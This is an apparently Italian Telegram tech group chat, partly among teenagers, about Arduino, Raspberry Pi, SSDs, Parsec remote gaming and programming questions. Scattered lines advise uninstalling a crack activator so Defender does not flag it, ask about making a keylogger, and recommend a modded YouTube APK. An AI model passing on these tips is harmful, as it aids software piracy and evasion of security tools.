ho fatto il sub su Twitch a uno e proprio in quel momento deve smettere di funzionargli streamlabs
uh ecco
comunque è kenzo
usa prop editor
o qualcosa di simile
io lpho usato per avere gassistant
ciao, ma le distro x86_64 funzionano su pc 64bit???
Si
perchè cosa devo modificare nel build prop?
io ho scaricato arch, ma una volta fatto il boot non va...sapete perchè??
eeeh saperlo
D: ma esistono versioni di arch 64bit??
 is the way
Cos ma sì
e dopo che l'hai attivato ricordati di disinstallarlo, altrimento Defender te lo rileva come virus..tanto la crack rimane ugualmente
Con cosa? Occhio che finisce sui tetti
ok, grazie
Qualche Tab aperta
Sigh
qualche... giusto un po
teoricamente andrà a 750 mega al secondo
no?
per certe ricerche all'ultimo minuto ne avevo anche di più
Infatti non è il mio record... Il problema è che poi non si capisce più nulla 
E giusto qualche estensione
Poca roba
Infatti
per fortuna hanno inventato gli spazi di lavoro. potresti creare un desktop virtuale per ogni categoria di tab del browser
già, ma non sono cosi studiato
no quello è il limite fisico del sata (6 gb)
inizialmente può sembrare scomodo, manco prendi la mano a lungo termine e soprattutto ottimizzi il tutto
sono le piccole cose che facilitano il workflow
devo iniziare a usarli allora
poi da quel che so li hanno pure messi su win 10
Io ci ho provato, ma alla fine avevo 4 o 5 finestre aperte e non mi ricordavo dove fosse la scheda che cercavo
ripperoni
ovvero?
dice 6Gb/s
proprio qualcuna, poche poche
no dice che utilizza l'interfaccia SATA III che va a a 6Gb/s al massimo
ahhh
ok, grazie
la velocità in se dell'ssd piu o meno è questa
a quanto pare niente male
Ciao,ho una domanda, posso con ifttt inviare una richiesta ad un broker mqtt direttamente senza avere server in mezzo per gestire la richiesta? Grazie
1. Controlla che il coupon non sia finito
2. Ha senso, fai due ordini separati e dovrebbe andare
ma non puoi farlo con l'UNO 
solo con alcune Verbatim di moolto tempo fa

Ho comprato Arduino micro leonardo
Hai la mia stima 
ce n'erano solo 50, molto probabile che scadano in fretta

just a bit
ah ok dovrebbe andare allora
Se tutto va bene mi arriva oggi
Ahahaahahahaahah Filippo che recupera tutti  i messaggi passati 

Io mettevo la faccia dei professori sugli animali, ottenendo le foto (da 0.00001Mpx) con mille peripezie usando il Nokia sotto il banco
Ma che ahahahahah
Mi ricordo che la prima volta che ho aperto minecraft era anche la prima volta che ho aperto un videogioco, ed ero lì che sudavo che neanche agli eSports... Poi quand'è arrivata notte ho chiuso 
Tipo così? È una clip che ho fatto in una live ieri
Tipo, anche se era solo su una faccia del cubo 
Già sapevi come funzionassero le texture?
Sono PNG dentro a uno zip 
Lo so, ma prima di capire come funzionasse ci ho perso un po'
Poi l'ho capito disegnandoci sopra con Paint e vedendo dove appariva ingame
Real programmers
HAHAHAHAAHAHA
real programmers are the minecrafters
Ovvio

Classico esempio di chi vuole passare dalla mentalità dei Command Blocks di Minecraft a quella di un normale programmer.
 ci sei lunedì al romecup?
Gente, le vere olimpiadi di robotica sono quelle a Trento mercoledì giovedì venerdì d sabato
Ma ci vado con la scuola
Ah beh in tal caso..
Siamo andati anche alla maker con la scuola
Figo figo
Beh se sei di Roma ci sta assai
Venerdì?
Command blocks 
Romecup è falzaa
Nah, li ho usati un mesetto e poi mi sono messo a programmare plugins
Io tantissimo all'epoca
Quando non esistevano i comparators quindi per fare una cagatina con 4 command blocks dovevi stemdere chilometri di redstone
Se vuoi fare le cose per bene non devi usare la redstone con i cb
E dalla 1.9 nemmeno i fill clock
Questo weekend?
Dalla 1.9 il comando che c'è dentro si triggera automaticamente a 20Hz, prima della 1.8 bastava mettere 2 cb che piazzavano e levavano dei blocchi di redstone 20 volte al secondo.
Poi per tutto il resto si lavora con le scoreboard, non con i repeater e i comparator
Sisi questa settimana qui
Caspita, vorrei venire
Quando hai il telefono scarico
5 metri di cavo usb?
Sembra homemade
Sono 3
E non è homemade
È della Anker
Cribbio ma quanti anni hai?
Il mio primo gioco era su un Atari 2600
Ed era Moon Lander se non erro
21
Ma non è uscito da molto quel gioco
Mi ricordo che era invasato di minecraft quando era in quinta superiore 
Minchia
E così tardi ha cominciato?
Ma no probabilmente anche prima boh
Non lo conoscevo prima 
Si può fare un mini pannello fotovoltaico fatto in casa?
Si, ma penso che nn ti dia molti volt in uscita
Ma, quello è il meno
È giusto per un progetto scolastico
Grazie
oppure cannibalizzi powerbank
e calcolatrici
È un casino della madonna saldare ogni cella all'altra, sono molto fragili
Yess
Dove si possono trovare le celle?
Su banggood c'è qualcosa
su Aliexpress c'è tutto
Pannello fotovoltaico per il mini pannello solare monocristallino 3w 9V

esix sei quello di youtube?
Ciao  si
oddio bella
ho comprato i digimark mi arrivano oggi sono 3
speriamo funzionano
Sono sicuro ti divertirai 
 potresti incominciare a fare la serie di hacking insieme a esix
ma tipo qualche keyogger si può fare??
Si può fare una comunicazione arduino-Raspberry senza usare l’usb?
Ah
Infatti
 stavo cercando su YouTube un confronto fra tutti i principali tipi di arduino e non c’è molto, soprattutto in italiano.. potrebbe essere un’idea
mi dispi ma noh
ci abbiamo provato a lungo nel nostro progetto
Peccato 
devi usare l'usb, se poi vuoi alimentarli separatamente basta che tagli i cavetti laterali dell'usb e li connetti alla tua batteria esterna per alimentare l'arduino ma in genere non puoi instaurare una connessione seriale tra i 2 lavorando su tensioni diverse
Vai, faccio spesona da banggood e ci vediamo tra due settimane 
Beh ci sono gli arduino a 3,3v
Ahahaha grande
no beh, credo intendesse senza il bisogno di averceli tutti e 99 in mano mentre li recensisci
eee con quelli allora puoi
se hanno i seriali che lavorano a 3.3v allora puoi
voglio moreeri
Certo
scusate qualcuno sa come cryptare file con python stile Mr.Robot?
Aiutooo
Ah
che vuol dire
Blink... La RED...
25.000€ solo il brain 
Una camera sprecata xD
Toto è ovunque, come me
Perché stare in un gruppo solo quando puoi avere il supporto di tutti? 
Che spesse volte sono gli stessi? XD
Ma sì fan bene
nooooooooooooooooooooooooo non ci credo!!!!la RED!!!!!
Blink ha una figlia?!
ti prego, l'unico che stimo di quei 4 è Sgnaolin..Ghela, Climan, Lo Monaco e Agostini sono 2 palle assurde
ah ok :D io conosco Ghela e i suoi compagni di merende, a quegli altri 2 non li ho mai sentiti nominare.. già il fatto che va in giro con Climan per me è: "No Maria, io esco"
Qualcuno se ne intende di amplificatori per la casa?
Quelli 7.1
Sgnaolin è il mio preferito della combriccola, mi fa crepare dalle risate..e poi è un outsider  un fanboy OnePlus-Xiaomi così è difficile da trovare..almeno non è il solito Apple Fan..già il fatto che utilizza un Mi Notebook ed un Chromebook me lo fa piacere 
XD

Ah no ok
Comunque si ahaha
Che devi fare? Pyserial + hc-05 potrebbe essere una via
?

troppe morti sul lavoro in questo periodo...
rega
allora, mettiamo subito le cose in chiaro
ho bisogno di programmatori brevi se non esperti
solo per curiosità, per cosa?
Severa e decisa
?
Abbiamo forme umane dell'altro sesso in questo gruppo? 
un'app/ impostazione, che vada ad interagire con il telefono, ma non con il telefono oggetto, con l'app
si
già
(Non sto facendo nessuna discriminazione sia chiaro)
tranquillo
mi fa piacere essere l'unica :)
non l'unica ma diciamo una delle poche 
ah okei
tornando al mio discorso
io nop, conosco java ma applicato ad android mai provato
vabbe, potresti essere utile
per cosa? 
ma io mi chiedo, cosa se ne fa?
LoL
Fa il MKBHD
uauuu abbiamo scoperto la lente di ingrandimento
con qualche iscritto in meno
"bravi se non esperti"
Posso dirlo di me per java, ma non per android, conosco java ma non saprei da dove cominciare 
Ssshh 
Cos’è hc-05? Per ora uso pyserial con l’usb
ma sto coso non sa scrivere
è un STT, è inutile in pratica
lo so
comunque non posso, anche perchè sono occupato con altri progetti
okei
conosci gente brava?
(Tra cui un serv.. 
)
no, prova a chiedere su 
 o non so se esiste un gruppo androiditalia
(spero che questo non valga come spam)
.
 e invece sì
Jk
hai un canale youtube?
Modulo bluetooth per arduino
Va sempre via seriale
ma AMD che si spamma la homepage nel browser mentre aggiorna i driver?
qualcuno perfavore può scaricare il link da mega e caricarmelo su mediafire?
hehe
perchè amd e non intel? se posso chiedere
Penso siano driver video
perché Intel non fa schede video
e poi in caso fosse un processore, i processori di AMD li preferisco rispetto agli Intel
why???
Io?
perché sono molto più potenti?
si
non penso prorpio
perfavore
poi dipende quale metti a confronto
Sei rimasta un po' indietro
1) Java non è l'unico ad avere un paradigma di programmazione ad oggetti
2) Java è un linguaggio a grande raggio, che può andare dalla piccola Applicazione Android, a grandi sistemi di Automazione e addirittura alla creazione di Rest API 
2) Chi non sa Java non vale una pippa?
Metti Coffee Lake vs Ryzen 2
rimasta*
scusami, non avevo visto l'immagine del profilo
il primo in gaming spinge sicuramente di più ma in multi threading AMD lo batte.
Sei nel gruppo del mio canale youtube 
Ahahahaahahah
beh, l''ultimo coffee lake è vicino al rayzen 5
vabbe, ma li a meno che uno non usi il pc a livelli estremi, non è che noti molto la differenza
Quello sì
Le differenze sono piccole
sooo, per il gaming io solitamente se devo fare un preventivo uso intel
Mi sa che tocca fare ordine, è la terza volta che mi giro e butto qualcosa per terra
Se c'è differenza di prezzo prendo quello che conviene economicamente, altrimenti sì, in una build da gaming anche io ci butterei un i5
Infatti io ho un i5 eh
hai fatto bene
MARCO
hai il K53E della ASUS????
Anche io l’ho!!!
A parte che Ryzen non era ancora uscito quando ho preso il PC, erano i tempi di Skylake
K53S V
Mmm
L'alimentatore da banco davanti al SubWoofer? Non se ne parte con Bass House pesante?
Quello con i5 2430M e GT 540M
Come hai messo quella barra delle app così piccol?
Perché dovrebbe ahahahah
Hai SSD?
Sì, su entrambi i PC
Sul portatile un SSD della SanDisk che prima stava nel fisso ma l'ho cambiato con un 960 EVO per problemi di spazio
Ergo non altera l'esperienza uditiva?
Macché
Come hai messo quella barra delle app così piccol?
dalle impostazioni premendo tasto destro
Anzi, la musica non mi fa sentire il cazzo di ronzio della ventola di quell'alimentatore, che per quanto appena udibile è fastidioso
Non ha senso averla enorme, ruba spazio
E poi spesso non mi entravano tutte le icone
Come hai fatto?
 When UX Design is just perfect 
Quel portatile è il prossimo che va a terra...trooooppo poco spazio
dopo le cadute che ha fatto, questo è niente
Ahahahahahaha
diciamo che ora gli viene a mancare il jack audio e del vecchio HDD si erano rotti 50GB di settori
Era scontato dai
Mmmm
Io ho Ssd kingstone
Ahah piccolo comunque
Come riduco la dimensione della barra senza applicare quella moddalita?
rega, ma quanti anni avete?
almeno il tuo ha ancora lo schermo
è scritto nella mia bio di Telegram, 16.
Pochi, 14
16
Why?
perché pochi ahahah?
In confronto a un quarantenne saranno pochi, ma in confronto a uno di 10 anni?
14
LoL
è relativo
mi scusi se non l'ho guardata
dopo svariate cadute lo scgermo è diventato diciamo "inutilizzabile"
Come la rimpiccolisco senza attivare quella moddalita?
COSA HO APPENA CISTO?
Oddio
perché mi dai del lei ora?
MARCOOOOOO ❤️
non penso si possa

boh, a caso
ci ha preso in pieno, GIURO
Ma dai
Nuovo è in garanzia
Per un difetto del genere
Il pro delle batterie
Hot swap
a me si ruppe una riga di pixel nell'xps preso da Amazon e me lo cambiarono comunque ma, so che per i monitor le garanzie non coprono quasi mai niente
Ma quanto figo è Parsec?
Abbastanza
Che è il parsec?
Adesso posso giocare a Fortnite e csgo a scuola
Installo parsec sul PC che mi hanno dato a scuola, lascio il PC accesso a casa e boom
Oh ma hai un PC da gaming?
Un software per il gaming su macchine da remoto
E non lagga?
Per esempio, se hai un PC portatile schifoso e un fisso buono (come me), con Parsec accedi al fisso con un input lag quasi nullo
Lo sto provando in Wi-Fi a 2,4Ghz ed è giocabilissimo
Ah
Ora sono curioso di provarlo con un'altra connessione
(Rip giga della Wind)
LoL
620 euro
Si è preso 100MB tondi tondi
Calcolando che ho questa connessione in 4G, con 20ms di ping, e 5ms di ping dal fisso... L'input lag è ottimo
Con gli stessi settaggi (alta risoluzione e grafica buona) sono arrivato ad avere (ad occhio) sui 300ms di lag, che ci sta
pagata 800
uh mado
io ho preferito far prendere polvere al PCI express
Il mio problema è che non ho un fisso decente
Se hai la fibra puoi affittare un PC loro per giocarci
Costa pochi centesimi ogni mezz'ora
Non ho nenache una buona connessione
E paghi in base alle risorse che vuoi
Che poi in realtà sono riuscito a tirare 2 kill su Fortnite con il 4G, quindi
Vedrò
Se hai una 20 mega forse ce la fai
Per fortnite quando all'ora?
L'importante è che il ping sia basso
Interessante sto Parsec! Ma per giocare online è viabile? O è percettibile il ritardo?
Bho, dopo ti dico
È percettibile ovviamente, ma rispetto a molti software che ho provato è il migliore
Il pc remoto "lo prendi" sempre su parsec? O parsec è solo il software? Non ne ero a conoscenza!
sempre su Parsec
ecco i prezzi di parsec per affittare una macchina loro
sono dollari all'ora
Nome originale mi dicono
Qualcuno sta settando un server spigot
Come si chiama?
Ma non puoi usare Parsec per Spigot, è per giocare
Ah ma è solo un'istanza, come non detto
Oggi mi sono visto alcuni snippet di qualche plugin, ma bho, c'è qualcosa che non mi convince
Un virus con i command block che distrugge i server(boh una volta ho visto un commando che aveva rotto il server,e lo avevano scritto su una tabellina..... ho visto in un vid)
Raga. C'è  un ragazzo nel YT,fa tanti vid dove dice "sono un hacker ecc" di solito è  chiaro che sta mentendo ma cmq è  molto strano perché  non è  nemmeno stupidissmo se guardo il suo canale telegram .-.
Hai mai codato un minigame?
io devo ancora comprarlo da tipo 4 mesi hahahaha
Per fortinite quale?
Uguale
ma io sopra posso installarci quello che mi pare?
Purtroppo è così... Dopo che i mass-media parlano di 
, i piccoli casi iniziano a moltiplicarsi, solo perchè si è data notorietà all'argomento, che magari da tempo si ripeteva un po' ovunque
ah 
E non poco 
HAHAHAHAHHHAHAHAHAHAAHAHHAAHAHAHAH
Si, ho capito, voglio sapere quale sarebbe la scelta minima per giocare senza problemi 
rAcCOmAnDAt0

comprare su Amazon con l'1% di batteria: fatto ✅
Ho una board di Arduino per il controllo di motori DC e servo, non so come farla funzionare, se collego i motori ai pin digitali di Arduino funziona tutto bene, quando provo la board non accade nulla, consigli?
Hai una lista da completare tipo 
?
Come provare subito di brutto le nuove cuffiette
Download? Cos
OG YouTube
È una versione di Youtube modificata
Ah
Avete l'apk?
Lo uso solo per i video in background, non ho mai scaricato un video
Io ce l'avevo, non mi ricordo perché l'ho disinstallata
Stra utile quella funziona, se aggiungessero la riproduzione a schermo spento sarebbe il top
Sii sono riccoo
Non é più aggiornata, ti consiglio di scaricare invece YouTube Vanced
Ahahahaha
Non la mettono se no YouTube Red sarebbe inutile

Grazie
*e contro i ToS*
Ahhh Youtube red te lo permette?
Non lo sapevo
Da quello che ho capito si, ma a pagamento e non in Italia
Sisi
Pensavo ti dasse contenuti in più e basta
Ovviamente, aggiungerei
Desse* ❤
Beh, si
Dopo aver formattato cosa fate oltre ad installare Firefox?
I driver li installate uno per uno o con qualche tool?
Ovviamente parlo di win
Install linux
Se lo potessi mettere
Ma non posso giocarci
Formatto e installo linux
Lo uso in VM
Dual boot e tieni Windows con i soli giochi
Su un SSD da 120gb la vedo difficile
20GB per linux bastano e avanzano
-.-
Lo mettono su 4MB
Credo sia una distro apposta
Non credo che manjaro funzionerebbe...
E tu metti la distro apposta per te, this is linux
Sorry
Dubito che manjaro voglia più di 2GB
E tutta la roba che mi serve?
Il 90% delle cose ci saranno già
E se mi faccio una pendrive apposta?

Che me la porto in giro dove voglio e la uso?
Perché?
Mettilo su quel cavolo di ssd
Il boss che mi consiglia libri...
(l'url dovrebbe far già partire il video a 16:03)
Ora Marco lo pinna e mando questo messaggio per farmi notare da molte persone
 
A me non mi si apre?? E poi... Ti offendi se ti chiedo una cosa?.... Chi è ?
Eh?
Io sì
Non capisco
Che  board è?
Cinguanta eurii
Si ma come?
In una settimana ...
Io mi suicido. Ho saldato i due pin per far funzionare l’interruttore con il sonoff e non si accende più il sonoff
:(
Però forse ho sistemato
In un giorno
L'ho aperto oggi il conto
Una l293d
Già
Si, ma come?
Apri e guarda 5 secondi (da 16:03)
Capo di tutta Tom's Hardware Italia, capo di Tom's Network e babbo di tutti noi youtuberz
È gay?
keledaaaan
Eh domani mi sa
bastano 3 parole per spiegare chi lui sia, 
È sposato e ha un figlio 🤔
Quelli sposati con figli non possono esserlo?
E anche se fosse?
No niente, chiedevo
Sai dove posso trovare le 2 stagioni?
TU

🤷‍♂ a quanto pare hahahaah
c'è, io se scendo sotto il 30 lo spengo per l'ansia
HAHAHAHAHAAHAHHAHAHAHAH
all'1% credo che aprirei iutub, farei partire "gotta go fast" e mi metterei in bici correndo come un disperato ad elemosinare corrente a 5V e powerbank
Sotto il 15% il mio si sfanculizza
Il touch fa quello che li pare
e la madon, quanto vecchio? solo con i telefoni vecchi mi succedeva che ad un certo punto non andava più decentemente
Reffato immagino 
2 anni fa a giugno
J5 2016
AHAHAHAHAH
strana come cosa
 [
] sta floddando. L'ho mutato.
Lol
E invece no
Purtroppo non è lui
obv, anche se ho annullato l'ordine perchè adesso non so di che taglia prendere l'ssd 
Euiiiiiiiiiiiiiii
beh perchè questa indecisione?
taglia nel senso quanti GiB?
prendi quello più costoso, tanto non paghi te, obv ù-ù
ragazzi
sto impazzendo con node e la condivisione di variabili da server side a client side
io ho una collezione su mongo. voglio far sì che io possa clickare su un div e farmi apparire la lista degli oggetti della collezione.
volevo usare un DOM method
solo che ovviamente la variabile è salvata su server side ( mongo ) . dom agisce solo su client side. come faccio quindi ad usare  i metodi DOM con delle variabili server side?
Spe, hai una variabile sul server e la vuoi mandare sul client? Capito bene?
è quello che ho capito pure io
sì, precisamente
Client side cosa usi? jquery?
nop. come view engine sto usando ejs. voglio modificare sto ejs in un modo dinamico con DOM.
Oddio, mai usato... Ma l'idea è all'occorrenza di fare una richiesta al server che risponde con una variabile in json ad esempio
per farti capire
un pastebin credo che sia più gradito
ok
un esempio?
Eh ajax... Ma non so come si possa fare con i framework che usi tu
per esperienza personale esprimo il mio parere soggettivo: ejs meglio lasciarlo perdere
ve?
a me sto ejs non mi sta semplificando la vita 
forse devo passare direttamente ad angular?
L'impianto elettrico: Mio cuggino lo fa aggratis 
Ma raga, come faccio a cambiare la dimensione di in array nel mezzo di metodo?
in che linguaggio 
Non mi picchiare...Java
Ah  ok, no idea allora
react, vue o angular
Sto smattando un botto
Ma in un array non si può cambiare dimensione una volta creato
Da quel che so (molto poco), devi crearti un array nuovo della dimensione nuova, copiarci dentro il vecchio e poi cancellare il vecchio
Infatti
O usare un oggetto (mi pare ArrayList, ma non sono sicuro.. l'avevo usato in processing quindi credo sia java)
Mmmmm sai cosa, faccio il controllo prima inizializzo l'array e lo pompo
Non si puo cambiare dimensione ad un array
Eh mi chiede di avere un array delle dimensioni di un fattore che non è sempre fisso
Fai il controllo prima e poi lo crei
Ciclo do-while
Sto facendo adesso
Grazie comunque❤️
In Algoritmi lo facciamo partire da 1 abah
rip
Di niente
Beh su matlab hanno senso farli partire da 1
ma che ca...
Guardate che figata di carte!!!
Pure in plastica o anche solo rivestite!!!
bellissime
però 15 euro meh
E 20 quelle tutte in plastica
Se avrò 40 euro da spendere le prenderò, forse
In java non so come si faccia ma si può, basta usare gli array dinamici, tipo in cpp vector o stack
Non gli ho ancora fatti
La cosa è che per passare tutti gli oggetti all'interno dell'array nell'array con n+1 oggetti avrei dovuto passarli uno per uno con un ciclo for
O magari ricorsivamente, non so dovrei pensarci ma non ho voglia
eeh invece sì 
Saad
HAHAAHAHAHHAHAHAH i cacciaviti mi hanno steso
250Gb
sono indeciso tra
- SSD 120 + caddy con HHD da 500
- solo SSD 240
forse conviene prendere solo l'ssd, pesa meno il pc e fa meno casino
Ma hai già un HDD?
sisi, devo cambiarlo al portatile
Mah, io lo terrei
Poi dipende per cosa lo usi
boh per tutto sostanzialmente  da programmare a video/music making
un ssd farebbe comodo
Beh allora tieni l'HDD piuttosto che portartelo sempre dietro in un case esterno
Dove si comprano? 
Playing cards have their values written as a code from different languages [x-post r/mildlyintersting]



by 
appunto, per quello sono indeciso se prendere l'ssd da 240... con quello nel pc sono a posto
dico proprio metterlo al posto dell'hard disk
Ti stimo.

raga se una rete wifi chiede nome utente e password come si chiama il tipo di autenticazione?
Prendi 240Gb e tieni l'HDD dentro
Se le trovo su amazon le compro, costino quel che costino
Ma quali quelle reti 'libere' alle quali devi fare l'accesso?
Magari
addirittura?
Ma prendi anche 1Tb ahaha
Dissipatori per rasp b+ sono uguali fra loro?
Basta prendere il più economico su AliExpress?
E mettere l'hdd nello slot cd pensavi? Evita, fidati, ti diventa un vibratore il pc
no in pratica tipo esempio su iphone vai nel elenco
e trovi "wifi-blabla" se clicco per collegarmi (di solito viene richiesta solo la password) ma su alcune reti ti chiede pure il nome utente
Dipende dal Caddy no?
ECCOLE
Boh
va a finire che tengo l'hard disk e pace, sarà lento ma ho spazio
Serio??
NON SO SE SONO UFFICIALI MA ECCOLE
🤷‍♂
Send me please
(la mano non si triggera più per il caps?)
Send nudes... ah no aspe
è da tipo 37 mesi che non lo fa hahahahaahahah
Swappa a un 7200 rpm, sull'altro pc va che è una bestia e avrà tipo 10 anni
Ahahahah 
Non mi ero mai accorto
Non sono studiatissimo a riguardo, so solo che anche da quel che mi dicono pure persone che lavorano in campo, quando pensavo di farlo, mi dicevano che in genere poi vibra tutto, non è el solido e il punto in cui lo metti è cruciale, finisce a vibrare tutto finchè lo usi
ok bene, scartata idea caddy 
Va beh ma poi devi anche ingegnerizzarlo
Se solo mia mamma mi prestasse il telefono...
Un po' di biadesivo e bona
uno dei motivi per cui volevo passare all'ssd era il rumore... ehm 
Come fate con solo ssd?
Fanno più rumore le ventole sinceramente
Io non lo sento nemmeno il mio
Io ho 500GB ssd, 2TB hdd in raid 1 e ancora son messo maluccio
No beh ssd senza niente altri hdd su un portatile non senti generalmente nulla...forse le ventole se hai un pc che se le fa sentire
beh per le robe che mi servono una volta al mese ho un hard disk esterno anch'io 
appunto... l'hard disk fa un casinissimo
È una cosa mentale in realtà, se hai in mano 500GiB di spazio ti sembra tanto quando lo usi..se hai 2TiB ti sembrano pochi perchè inizialmente sembrandoti tanti li hai impienati e ora non sai che cazz cancellare perchè ti sembra che ti serva tutto
Ma cosa
vabbè dormo, che domani ho verifiche 
il mio sì, troppo
Sul quel sito che in teoria è quello ufficiale costano 15 o 20 euro a mazzo
Ho visto (ho già fatto una lista di cose belle )









Lol
Sono FANTASICHE quelle robe 

sei senza speranza
Sì.
vista oggi sul gruppo Facebook degli EDM
Altro motivo per cui sono senza speranza: Fai conto che sono uno che mentre pensa deve avere qualcosa in mano... Avevo un paio di forbici e un Arduino, ecco indovina che ho fatto
Ma dai addirittura
confermo, si sente solamente la ventola che bestemmia
tu non sai che scrivania bella ordinata che gli avevo fatto fare..una giornata in remoto, tra foto e video
Ho ancora le foto
cable management e case occultato made by Korry
ecco..guard 
  la mia magia in remoto
a parte il sub 🤔
Ahahah
Ma c'è un problema di fondo
Quel monitor fa cagare
Ordinata per nulla
Avevo ancora il vecchio monitor
vabbè, per i programmi secondari va bene, ci visualizzi la chat se streammi
Non streammo più da una vita
Non faccio più video da una vita
Ergo lo uso solo per Discord e TeamSpeak, e per vedere due live in contemporanea
🤔il secolo buio?? che libro è?
è comodo anche per quello
Tipo ieri su un monitor avevo Sbriser che giocava a Fortnite e sull'altro Tutubo (aka YouTube Fa Cagare) che suonava piano e chitarra mentre leggeva la chat
Sbriser ha una postazione da orgasmo
Di mia mamma... Il secolo breve
Lo conosci?
Sai che qualche anno fa mi aveva chiesto di collaborare?
E gliel'ho rifiutata brutalmente
yes, ho visto la sua postazione sul Caricamente Tech Group e sul video delle configurazioni che ha vinto
Adesso ha upgradeato il PC
Sli di 1080 e non dico altro.
Due loop separati per il cooling
brava signora, fatelo studiare che è svogliato il ragazzo 
🤔devo andare a darci un occhiata
E si è fatto fabbricare dal ferramenta un pezzo per allargare il case per poterci mettere il serbatoio del nuovo loop
Ahahahahahhaahahahhaha nono ma non è un romanzo 
 io avrei usato il mio mitico gattuccio
Il chi?
sega a gattuccio..chiamata anche "convincitore di milf"..come apre questo non apre nessuno
Ah
io ho proprio questo AEG, roba professionale..taglia anche il cemento armato
Qual è il problema?
Non capisco come interfacciarmi con essa
Con Arduino. Collega i pin digitali di Arduino ai pin input della board.
Giorno guys
sapete per caso se facendo il fresh reinstall di windows si ripristinano anche l'MBR e la recovery?
Già fatto, ho i pin digitali 3,5,6,9 che variano il loro stato reciprocamente però i motori sulla scheda non funzionano
Io sarei per un reinstall pulito
sisi ma devo sistemare la recovery, se un reinstall non la sistema è inutile
Hai collegato i pin GND, 5v e VCC?
A questi due pin dovresti collegare l'alimentazione.
Invia il codice.
Ora non sto  a casa nel pomeriggio lo invio
Già fatto con un alimentatore a voltaggio variabile da 9v
camera mia è sempre così
eppure trovo sempre tutto
giorno gente
Ah beh allora sto tranquillo
bello

ATTENTO il notebook sta per cadere,prendilo nel volo!
Tranquillo è abituato a cadere
Soprattutto ora che non avevo sbatti e l'ho rimontato senza viti quando l'ho pulito qualche mese fa, quindi se cade si apre malamente
Via i tutor dalle autostrade

bello
Se lo flasho perdo la garanzia?
AHAHAHAHAHAH
Usa direttamente la libreria AF-Motor
 avrei una proposta su come migliorare il canale delle offerte, ti posso contattare in pvt?
Cambiare la tonalità di verde del logo
Nop
Se messa in pratica la mia idea potrebbe aiutare chi ha poco tempo e ricerca solo particolari offerte
Gli hashtag?
No, meglio
Un bot. Gli utenti che ricercano qualcosa di particolare mandano delle keyword al bot e questo da quel momento in poi (fino a quando non resetta la lista delle keyword) riceverà dal bot i post che vengono mandati su offervolt che contengono le keyword volute. Cosí si evita di dover aprire il canale ogni giorno e si riduce a 0 la possibilità di non vedere delle ovverte
Buongiorno, qualcuno che mi consiglia un app per vpn gratuita? Per android
Mmh ma così non segui più il canale e non scoprirai mai quanto ti serve un nuovo zaino col logo xiaomi o quanto comodo sia un mouse da 40cents da battaglia 🤔
Concordo con marco
Se uno ha la scimmia e non sa dove spendere i soldi apre comunque il canale
È una cosa utile soprattutto a chi sa già cosa vuole prendere ma aspetta solo l'offerta giusta e ha poco tempo per seguire il canale
Ma basta premere il tasto search nel canale
Si, ma costa tempo e c'è la possibilità di perdersi un offerta solo perché non si ha controllato il canale ogni tot ore
Sarebbe meglio se il bot "obbligasse" la persona che cerca qualcosa, di entrare nel canale. Tipo "forwarded message" e vai li per vedere che messaggio è
O anche solo mandare un messaggio del tipo "nel canale 
 è stato mandato un offerta che potrebbe interessarti"
Sì,poi un hastag che informa di cosa si tratta il post per es. 

Esatto
Ma.... ancora meglio se la persona soecificasse che categoria spammarlo. Esempio,scelgo la categoria 
 tutto quello che verrà postato con quel hastag sarà mandati in mp
Beh quelle sono aggiunte possibili. Come ricevere offerte che abbiano particolari range di prezzo o % di sconto
Beh in sto modo le  visual del canale sarano alzate
E chi ha particolari necessità le puó facilmente soddisfare
 auguri per i 2000 membri nel canale
Il problema è l'uso che se ne fa di questi dati
Peccato che quando installi l'app ti viene detto "installando quest'app accetti il 
", e nel contratto c'è scritto tutto ciò che fanno con i tuoi dati.
Non tutto? Peccato che sono obbligati dalla legge a scrivere tutto.
Non è una scelta? Sei libero di non utilizzare i servizi di Google.
Gracias! Aspettavo a festeggiare perché c'è sempre lo spiritosone che esce 
Aspetta i 2,1k così sei sicuro 
Esatto
Quindi in questo modo tu sei consapevole che Google dia i tuoi dati a terzi
Perché si è tolto il "+"
si ma così la gente guarda meno il canale e si perdono guadagni 
e lì parte lo scraping dal nostro bot e la vps muore 
Ridooo. Oggi ho fatto le prove INVALSI e scopro che sono hostate su 

over 
 seriamente?
Boh è il bot Telegram che l'avrà interpretato come codice
Mi sa che non mi segui su Instagram, Giulian 🤔
in realtà ti seguo ma non apro mai instagram
prova a rimettere il logo di overvolt su premiere🤔🤔🤔
Nop, basta fare in modo che i messaggi portino al canale
Ok, grazie dell'idea
Ora esco anche con i 3 VoIP
siamo a 2001, finisce male qua
Oh no
Tanto ho la screen 
gg
1999, scontato
Raga sono all'eng e non posso provare nel compilatore.. quindi..  se nel c++ un variabile a = funzione(); e return number del  function() == 5,allora a == 5?
Posta il codice(naturalmente non in messaggio, usa pastebin)
si
eh ma così comunque diminuisci le visualizzazioni di tutte le altre offerte, perchè la gente si fa avvisare solo su cose che già le interessano
sì ovvio
Questo ha vinto 
Ragazzi ma un modo economico per trasmettere in live un video registrato da una GoPro??
Per live intendo che lo possano vedere tipo altri che dico io
Oh buh su fb
O con un link
C'è un modo??
Tipo dovrebbe essere possibile collegarla al telefono
È usarla come webcam
Fai una live streaming?
Eh mi manca questo passaggio
Si
Si può collegare al cellulare con la sua app
Con come webcam
Obsv
iOS o Android?
Android
Grazie 
Dopo 10 giorni finalmente eccolo qui
Per avviare Raspbian basta mettere la ISO su USB con rufus?
io butto le iso sulla sd con etcher
Eh ok ma non ho un sd
Allora ti conveniva comprare un Kit, completo di tutto
costava troppo
ma con usb non funge?
il raspi può bootare da USB, ma devi cambiargli un bit nella OTP
ergo, almeno la prima volta ti serve una sd
Ok vedo se ne ho una da qualche parte
scusatr vi volevo chiedere se spengo e riaccendo il rusbery mi si redatta io con il Sonof attivo
molto confortante
ho trovato una micro sd di 8 gb andarà bene?
Resetta*
Penso di sì
per cosa?
Messaggi sopra
regaaaaaaa
di mattina tutti mordi ora 80 messaggi in non so quanto
allora si
Ragazzi ho appena comprato un raspberry pi zero w. Vorrei chiedervi se per caso c'è un modo, tramite bluetooth, per far sì che lo schermo del rasp si veda sul telefono.. spero di essermi spiegato  (so che tramite internet si può fare ma mi farebbe più comodo se fosse possibile con il bluetooth)

Sì... O meglio ancora con etcher che è più figo
lo sto scaricando 
solo il tempo di download di raspbian è 2 ore :(
Scarica da torrent
a m enon scarica la iso di winzozz 10
il tool di windows dopo un po si spegne e non salvaa il file
I server sono lentissimi, da torrent la scarichi in 5 min
sapete se posso procurarmela in qualche altro modo?
ok
è sicuro?
o ci sono gli hacerini11!

 ‎So‎lo‎ €‎83‎6.‎99
